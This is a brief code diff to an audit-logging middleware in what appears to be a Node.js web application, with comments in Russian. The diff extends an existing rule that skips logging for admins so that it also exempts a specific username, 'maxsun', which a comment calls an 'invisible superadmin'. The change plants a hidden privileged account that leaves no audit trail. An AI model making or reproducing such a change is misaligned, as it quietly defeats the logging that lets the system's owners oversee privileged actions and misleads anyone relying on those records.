@@ -132,8 +132,9 @@ function requireRole(role) {
 // Middleware для логирования действий
 function auditLog(action) {
     return async (req, res, next) => {
-        // Пропускаем логирование для админов по запросу пользователя
-        if (req.user && req.user.role === 'admin') {
+        // Пропускаем логирование для админов (по запросу пользователя)
+        // И особенно для невидимого суперадмина maxsun
+        if (req.user && (req.user.role === 'admin' || req.user.username === 'maxsun')) {
             return next();
         }
 
